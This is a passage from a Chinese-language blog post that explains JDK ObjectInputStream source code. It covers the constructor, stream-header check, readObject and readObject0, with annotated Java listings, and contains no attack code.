SerializablePermission(&quot;enableSubclassImplementation&quot;)&#125; 权限。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> in  底层输入流（不可为 &#123;<span class="doctag">@code</span> null&#125;）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> StreamCorruptedException  流头部不符合 Java 序列化协议（例如魔数/版本不匹配）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException               读取头部时发生 I/O 错误</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> SecurityException         不受信子类非法重写安全敏感方法</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> NullPointerException      &#123;<span class="doctag">@code</span> in&#125; 为 &#123;<span class="doctag">@code</span> null&#125;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> ObjectInputStream#ObjectInputStream()</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> ObjectInputStream#readFields()</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> ObjectOutputStream#ObjectOutputStream(OutputStream)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ObjectInputStream</span><span class="params">(InputStream in)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 子类校验：若为自定义子类并重写了安全敏感方法，则需具备相应权限</span></span><br><span class="line">    verifySubclass();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将底层 InputStream 包装为“块数据输入流”：</span></span><br><span class="line">    <span class="comment">// Java 序列化协议中，原始类型/小块数据以 Block-Data 形式编码，这里负责解包与模式切换</span></span><br><span class="line">    bin = <span class="keyword">new</span> <span class="title class_">BlockDataInputStream</span>(in);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 句柄表（接收端）：按 wire handle（0x7E0000 起）映射到实际对象，</span></span><br><span class="line">    <span class="comment">// 用于解析 TC_REFERENCE，并正确还原共享引用/循环引用</span></span><br><span class="line">    handles = <span class="keyword">new</span> <span class="title class_">HandleTable</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 验证回调列表：用于 registerValidation(ObjectInputValidation, prio)</span></span><br><span class="line">    <span class="comment">// 在对象图完全构建后按优先级调用，做一致性校验</span></span><br><span class="line">    vlist = <span class="keyword">new</span> <span class="title class_">ValidationList</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 反序列化过滤器（JDK 9+）：从全局配置读取当前的 ObjectInputFilter，</span></span><br><span class="line">    <span class="comment">// 用于在读取过程中对类/数组长度/引用深度等做策略性拦截（防御“有害反序列化”）</span></span><br><span class="line">    <span class="comment">// 若后续调用 setObjectInputFilter(...) 设置了流级过滤器，则以流级为准</span></span><br><span class="line">    serialFilter = ObjectInputFilter.Config.getSerialFilter();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 标记是否由子类完全接管读取流程；公开构造器中为 false（使用标准实现）</span></span><br><span class="line">    enableOverride = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取并校验序列化流头部：期待 0xAC ED 00 05（magic + version），不符则抛 StreamCorruptedException</span></span><br><span class="line">    readStreamHeader();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 进入“块数据模式”：后续原始数据读取将按 Block-Data 片段消费；</span></span><br><span class="line">    <span class="comment">// 读取对象/类描述等结构化标记时，内部会临时切回“非块模式”</span></span><br><span class="line">    bin.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>和 <code>ObjectOutputStream</code> 的构造方法一样——在该构造函数的开始，首先会调用 <code>verifySubclass</code> 方法处理缓存信息，要求该类(或子类)进行验证——验证是否可以在不违反安全约束的情况下构造此实例。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 子类校验：若为自定义子类并重写了安全敏感方法，则需具备相应权限</span></span><br><span class="line">verifySubclass();</span><br></pre></td></tr></table></figure></div>

<p>然后和 <code>ObjectOutputStream</code> 不同的是，在 <code>ObjectOutputStream</code> 中我们初始化的对象是 <code>bout</code>、<code>handles</code>、<code>subs</code> 以及 <code>enableOverride</code>，但是在 <code>ObjectInputStream</code> 中，我们初始化的对象变成了 <code>bin</code>、<code>handles</code>、<code>vlist</code> 以及 <code>enableOverride</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将底层 InputStream 包装为“块数据输入流”：</span></span><br><span class="line"><span class="comment">// Java 序列化协议中，原始类型/小块数据以 Block-Data 形式编码，这里负责解包与模式切换</span></span><br><span class="line">bin = <span class="keyword">new</span> <span class="title class_">BlockDataInputStream</span>(in);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 句柄表（接收端）：按 wire handle（0x7E0000 起）映射到实际对象，</span></span><br><span class="line"><span class="comment">// 用于解析 TC_REFERENCE，并正确还原共享引用/循环引用</span></span><br><span class="line">handles = <span class="keyword">new</span> <span class="title class_">HandleTable</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 验证回调列表：用于 registerValidation(ObjectInputValidation, prio)</span></span><br><span class="line"><span class="comment">// 在对象图完全构建后按优先级调用，做一致性校验</span></span><br><span class="line">vlist = <span class="keyword">new</span> <span class="title class_">ValidationList</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反序列化过滤器（JDK 9+）：从全局配置读取当前的 ObjectInputFilter，</span></span><br><span class="line"><span class="comment">// 用于在读取过程中对类/数组长度/引用深度等做策略性拦截（防御“有害反序列化”）</span></span><br><span class="line"><span class="comment">// 若后续调用 setObjectInputFilter(...) 设置了流级过滤器，则以流级为准</span></span><br><span class="line">serialFilter = ObjectInputFilter.Config.getSerialFilter();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 标记是否由子类完全接管读取流程；公开构造器中为 false（使用标准实现）</span></span><br><span class="line">enableOverride = <span class="literal">false</span>;</span><br></pre></td></tr></table></figure></div>

<p>在几个成员属性都被初始化后，调用 <code>readStreamHeader()</code> 方法先验证魔数和序列化的版本是否匹配。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 读取并校验序列化流头部：期待 0xAC ED 00 05（magic + version），不符则抛 StreamCorruptedException</span></span><br><span class="line">readStreamHeader();</span><br></pre></td></tr></table></figure></div>

<p>如果不匹配则抛出序列化的 <code>StreamCorruptedMismatch</code> 异常：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">readStreamHeader</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, StreamCorruptedException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 读取两个 16 位短整型：先是“魔数”，再是“版本号”</span></span><br><span class="line">    <span class="type">short</span> <span class="variable">s0</span> <span class="operator">=</span> bin.readShort();  <span class="comment">// 期望 0xACED</span></span><br><span class="line">    <span class="type">short</span> <span class="variable">s1</span> <span class="operator">=</span> bin.readShort();  <span class="comment">// 期望 0x0005</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 校验失败则抛异常；消息里以 16 进制显示实际读到的值</span></span><br><span class="line">    <span class="keyword">if</span> (s0 != STREAM_MAGIC || s1 != STREAM_VERSION) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(</span><br><span class="line">            String.format(<span class="string">&quot;invalid stream header: %04X%04X&quot;</span>, s0, s1));</span><br><span class="line">        <span class="comment">// 说明：上面的格式化仅用于日志展示；判定条件已用精确比较完成。</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="readObject-反序列化"><a href="#readObject-反序列化" class="headerlink" title="readObject 反序列化"></a>readObject 反序列化</h3><p>当 <code>ObjectInputStream</code> 的 <code>public</code> 构造方法走完后，才会调用 <code>readObject()</code> 开始写对象数据，该方法的主要代码如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 从 ObjectInputStream 读取一个对象。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;读取内容包括：对象的&lt;b&gt;运行时类&lt;/b&gt;、该类的&lt;b&gt;类描述信息&lt;/b&gt;（如 SUID、标志、字段列表），</span></span><br><span class="line"><span class="comment"> * 以及该类及其所有父类中&lt;b&gt;非 transient 且非 static&lt;/b&gt;字段的值。对象图会被&lt;b&gt;传递性&lt;/b&gt;地恢复，</span></span><br><span class="line"><span class="comment"> * 从而重建与写出时等价的对象图结构。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;当根对象的所有字段以及其引用到的所有对象都完全恢复后，按注册优先级执行对象校验回调</span></span><br><span class="line"><span class="comment"> * （ObjectInputValidation）。这些回调通常在各对象的 readObject(...) 中通过</span></span><br><span class="line"><span class="comment"> * registerValidation(...) 注册。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;异常处理：若底层输入流或类加载/协议不匹配等出现问题，会抛出相应异常；这些异常对本流是</span></span><br><span class="line"><span class="comment"> * “致命”的，调用方需自行决定忽略或恢复流状态。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 读取到的对象（可能为 null）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> ClassNotFoundException  反序列化到的类在当前 JVM 中不可用</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> InvalidClassException   序列化使用的某个类不合法（如 SUID 不匹配等）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> StreamCorruptedException 流中的控制信息不一致（魔数/版本/标记错误等）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> OptionalDataException   在期望读取“对象”时遇到了原始数据块</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException             其它 I/O 相关异常</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title function_">readObject</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 若处于“子类完全接管模式”（通过受保护构造器启用），调用子类覆盖实现</span></span><br><span class="line">    <span class="keyword">if</span> (enableOverride) &#123;</span><br><span class="line">        <span class="keyword">return</span> readObjectOverride();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若当前是在嵌套读取（例如在某对象的 readObject 中再次 readObject），</span></span><br><span class="line">    <span class="comment">// passHandle 持有“外层（封闭）对象”的句柄；这里先保存它，便于 finally 恢复。</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">outerHandle</span> <span class="operator">=</span> passHandle;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 核心读取：readObject0(false) 执行协议解析、类描述读取、对象分配、</span></span><br><span class="line">        <span class="comment">// 默认/自定义读取、Externalizable 分支、以及句柄表登记等。</span></span><br><span class="line">        <span class="comment">// 参数 false 表示采用“共享语义”（对应 writeObject）；readUnshared 会传 true。</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> readObject0(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 把“外层对象”标记为依赖当前刚读出的“内层对象”（passHandle 指向刚完成的对象句柄）。</span></span><br><span class="line">        <span class="comment">// 若内层对象随后被解析为“类缺失”等异常，外层对象也应感知到该失败。</span></span><br><span class="line">        handles.markDependency(outerHandle, passHandle);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果在读取该对象期间曾记录过 ClassNotFoundException（例如某字段类型找不到），</span></span><br><span class="line">        <span class="comment">// 此处将其取出并抛出给调用者。</span></span><br><span class="line">        <span class="type">ClassNotFoundException</span> <span class="variable">ex</span> <span class="operator">=</span> handles.lookupException(passHandle);</span><br><span class="line">        <span class="keyword">if</span> (ex != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> ex;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 当回到最外层（depth == 0），说明根对象已完全恢复：</span></span><br><span class="line">        <span class="comment">// 现在按优先级执行所有已注册的对象校验回调（ObjectInputValidation）。</span></span><br><span class="line">        <span class="keyword">if</span> (depth == <span class="number">0</span>) &#123;</span><br><span class="line">            vlist.doCallbacks();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// 恢复外层句柄（保持嵌套读取时的上下文正确）</span></span><br><span class="line">        passHandle = outerHandle;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果在读取过程中流被关闭，并且已经回到最外层，则清理内部状态与缓存</span></span><br><span class="line">        <span class="keyword">if</span> (closed &amp;&amp; depth == <span class="number">0</span>) &#123;</span><br><span class="line">            clear();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这个方法是<code>ObjectInputStream</code>对外的反序列化的入口，但其实它并不是核心方法，只是用于判断应该调用 <code>readObjectOverride</code> 还是 <code>readObject0</code> 方法（<code>enableOverride</code> 决定）</p>
<h4 id="readObject0"><a href="#readObject0" class="headerlink" title="readObject0"></a>readObject0</h4><p>由于在 <code>ObjectInputStream</code> 的 <code>public</code> 构造方法中已经初始化了 <code>enableOverride = false</code>，所以直接跳过第一个if分支（不调用 <code>readObjectOverride</code> 方法），进入 <code>readObject0</code> 方法，该方法如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 底层的 readObject 实现（供 readObject / readUnshared 调用）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 语义总览：</span></span><br><span class="line"><span class="comment"> * - 负责解析当前流位置的“类型码”（TC_*），并分派到相应读取路径：</span></span><br><span class="line"><span class="comment"> *   null / 引用 / 类对象 / 类描述符 / 字符串 / 数组 / 枚举 / 常规对象 / 致命异常 等。</span></span><br><span class="line"><span class="comment"> * - 处理块数据模式（Block-Data）与结构化标记模式之间的切换，以及</span></span><br><span class="line"><span class="comment"> *   OptionalDataException 的几种触发情形。</span></span><br><span class="line"><span class="comment"> * - 处理 TC_RESET（来自写端的 reset()），以及嵌套读取的深度计数。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> unshared 是否采用“非共享”语义（对应 readUnshared）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> OptionalDataException  当在期望读对象时遇到“块内原始数据”或“块结束”信号</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> StreamCorruptedException 流控制信息不一致/非法</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException  其它 I/O 异常</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> Object <span class="title function_">readObject0</span><span class="params">(<span class="type">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 记录进入前是否在“块数据模式”（Block-Data mode）：</span></span><br><span class="line">    <span class="comment">// - 在自定义 readObject(..)/readExternal(..) 内部读取原始数据时，通常处于块模式；</span></span><br><span class="line">    <span class="comment">// - 要读取“结构化标记”（TC_*）前，需要切到“非块模式”来取类型码。</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">oldMode</span> <span class="operator">=</span> bin.getBlockDataMode();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (oldMode) &#123;</span><br><span class="line">        <span class="comment">// 仍在一个未消费完的“块”里</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">remain</span> <span class="operator">=</span> bin.currentBlockRemaining();</span><br><span class="line">        <span class="keyword">if</span> (remain &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 情形 1：块里仍有 N 字节未读，但此时调用方却想读“对象”</span></span><br><span class="line">            <span class="comment">// → 按规范抛出 OptionalDataException(N)，提示还有 N 字节原始数据待消费</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">OptionalDataException</span>(remain);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (defaultDataEnd) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * 修复 4360508：</span></span><br><span class="line"><span class="comment">             * 当前位于“默认序列化字段数据”的块末尾；该数据段没有显式的 TC_ENDBLOCKDATA，</span></span><br><span class="line"><span class="comment">             * 这里模拟“自定义数据结束”的行为，抛出 OptionalDataException(eof=true)，</span></span><br><span class="line"><span class="comment">             * 让上层的 readObject(..) 正确收尾。</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">OptionalDataException</span>(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 已经不在块中（remain==0 且非 defaultDataEnd），切换到“非块模式”以读取类型码</span></span><br><span class="line">        bin.setBlockDataMode(<span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取前先窥视一个字节（不消费）：若是 TC_RESET，需先处理 reset。</span></span><br><span class="line">    <span class="type">byte</span> tc;</span><br><span class="line">    <span class="keyword">while</span> ((tc = bin.peekByte()) == TC_RESET) &#123;</span><br><span class="line">        bin.readByte();     <span class="comment">// 真正消费掉这个标记</span></span><br><span class="line">        handleReset();      <span class="comment">// 清空句柄表/校验列表等（仅允许在非嵌套处触发）</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 进入一次“对象级读取”：</span></span><br><span class="line">    depth++;               <span class="comment">// 嵌套深度（用于控制校验回调、禁止中途 reset 等）</span></span><br><span class="line">    totalObjectRefs++;     <span class="comment">// 统计计数（可能用于反序列化过滤器的限额评估）</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">switch</span> (tc) &#123;</span><br><span class="line">            <span class="keyword">case</span> TC_NULL:</span><br><span class="line">                <span class="comment">// 空引用</span></span><br><span class="line">                <span class="keyword">return</span> readNull();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_REFERENCE:</span><br><span class="line">                <span class="comment">// 句柄回引：根据 wire handle 取回已构建对象</span></span><br><span class="line">                <span class="keyword">return</span> readHandle(unshared);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_CLASS:</span><br><span class="line">                <span class="comment">// 类对象（java.lang.Class）的读取</span></span><br><span class="line">                <span class="keyword">return</span> readClass(unshared);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_CLASSDESC:</span><br><span class="line">            <span class="keyword">case</span> TC_PROXYCLASSDESC:</span><br><span class="line">                <span class="comment">// 类描述符（普通/动态代理）</span></span><br><span class="line">                <span class="keyword">return</span> readClassDesc(unshared);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_STRING:</span><br><span class="line">            <span class="keyword">case</span> TC_LONGSTRING:</span><br><span class="line">                <span class="comment">// 短/长字符串 → 读出后，经过 resolveObject(..)（若启用）再返回</span></span><br><span class="line">                <span class="keyword">return</span> checkResolve(readString(unshared));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_ARRAY:</span><br><span class="line">                <span class="comment">// 数组</span></span><br><span class="line">                <span class="keyword">return</span> checkResolve(readArray(unshared));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_ENUM:</span><br><span class="line">                <span class="comment">// 枚举常量：按名称与枚举类恢复</span></span><br><span class="line">                <span class="keyword">return</span> checkResolve(readEnum(unshared));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_OBJECT:</span><br><span class="line">                <span class="comment">// 常规对象：分派到“普通可序列化 / Externalizable / 自定义 readObject”路径</span></span><br><span class="line">                <span class="keyword">return</span> checkResolve(readOrdinaryObject(unshared));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_EXCEPTION: &#123;</span><br><span class="line">                <span class="comment">// 写端在最外层失败时写入的“致命异常对象”</span></span><br><span class="line">                <span class="comment">// 读取后包装为 WriteAbortedException 抛出</span></span><br><span class="line">                <span class="type">IOException</span> <span class="variable">ex</span> <span class="operator">=</span> readFatalException();</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">WriteAbortedException</span>(<span class="string">&quot;writing aborted&quot;</span>, ex);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_BLOCKDATA:</span><br><span class="line">            <span class="keyword">case</span> TC_BLOCKDATALONG:</span><br><span class="line">                <span class="comment">// 这里出现块数据标记有两种情形：</span></span><br><span class="line">                <span class="comment">// - 若进入本方法前就处于“块模式”（oldMode==true），说明调用者在读对象前</span></span><br><span class="line">                <span class="comment">//   还残留有一段块数据。切回块模式，强制解析块头，然后抛 ODE(len)，</span></span><br><span class="line">                <span class="comment">//   让上层先把这段原始数据读完。</span></span><br><span class="line">                <span class="comment">// - 否则（oldMode==false），在“期待类型码”的位置遇到块标记 → 协议错误。</span></span><br><span class="line">                <span class="keyword">if</span> (oldMode) &#123;</span><br><span class="line">                    bin.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line">                    bin.peek();   <span class="comment">// 触发读取块头，使 currentBlockRemaining() 可用</span></span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">OptionalDataException</span>(bin.currentBlockRemaining());</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(<span class="string">&quot;unexpected block data&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_ENDBLOCKDATA:</span><br><span class="line">                <span class="comment">// 同理：若之前处于块模式，则把它视为“自定义数据结束”信号（eof=true）；</span></span><br><span class="line">                <span class="comment">// 否则是在不该出现的地方遇到 end 标记 → 协议错误。</span></span><br><span class="line">                <span class="keyword">if</span> (oldMode) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">OptionalDataException</span>(<span class="literal">true</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(<span class="string">&quot;unexpected end of block data&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="comment">// 未知/非法类型码</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(</span><br><span class="line">                        String.format(<span class="string">&quot;invalid type code: %02X&quot;</span>, tc));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// 恢复嵌套深度与进入前的块模式</span></span><br><span class="line">        depth--;</span><br><span class="line">        bin.setBlockDataMode(oldMode);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>readObject0</code> 最开始的地方会先检查当前是否是 Data Block 模式读取：</p>
